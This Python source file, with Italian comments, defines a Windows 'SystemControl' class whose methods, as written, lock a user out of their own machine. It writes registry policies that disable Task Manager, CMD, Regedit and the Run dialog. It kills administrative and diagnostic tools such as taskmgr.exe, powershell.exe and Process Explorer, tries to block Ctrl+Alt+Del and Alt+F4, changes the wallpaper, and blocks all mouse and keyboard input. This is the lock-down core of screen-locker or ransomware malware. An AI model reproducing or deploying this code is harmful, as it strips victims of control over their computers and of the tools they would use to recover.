"""
Controllo del sistema e blocco delle funzionalità di sicurezza
"""
import winreg
import ctypes
import os
import sys
from subprocess import CREATE_NO_WINDOW
import win32gui
import win32con
import win32api
import psutil

class SystemControl:
    def __init__(self):
        self.blocked_processes = [
            "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe",
            "ProcessHacker.exe", "procexp.exe", "procexp64.exe",
            "perfmon.exe", "mmc.exe", "msconfig.exe"
        ]
        
    def disable_security_features(self):
        """Disabilita le funzionalità di sicurezza di Windows"""
        try:
            # Disabilita Task Manager
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            
            # Disabilita CMD
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                "Software\\Policies\\Microsoft\\Windows\\System")
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
            
            # Disabilita Regedit
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            
            # Disabilita Run
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 1)
            
        except Exception as e:
            print(f"Errore durante la disabilitazione delle funzionalità: {e}")
    
    def kill_security_processes(self):
        """Termina i processi di sicurezza"""
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in [p.lower() for p in self.blocked_processes]:
                    proc.kill()
            except:
                continue
    
    def block_keyboard_shortcuts(self):
        """Blocca le scorciatoie da tastiera pericolose"""
        user32 = ctypes.windll.user32
        
        # Blocca ALT+F4
        user32.RegisterHotKey(None, 1, win32con.MOD_ALT, win32con.VK_F4)
        
        # Blocca CTRL+ALT+DEL
        user32.RegisterHotKey(None, 2, win32con.MOD_CONTROL | win32con.MOD_ALT, win32con.VK_DELETE)
        
        # Blocca Windows+R
        user32.RegisterHotKey(None, 3, win32con.MOD_WIN, ord('R'))
        
    def set_wallpaper(self, image_path):
        """Imposta lo sfondo del desktop dell'host"""
        try:
            # Verifica che l'immagine esista
            if not os.path.exists(image_path):
                return False
                
            # Imposta lo sfondo
            win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, 
                                        image_path, 
                                        win32con.SPIF_UPDATEINIFILE | 
                                        win32con.SPIF_SENDCHANGE)
            return True
        except Exception as e:
            print(f"Errore durante l'impostazione dello sfondo: {e}")
            return False
            
    def disable_user_input(self):
        """Blocca input da mouse e tastiera"""
        try:
            user32 = ctypes.windll.user32
            user32.BlockInput(True)
        except:
            pass
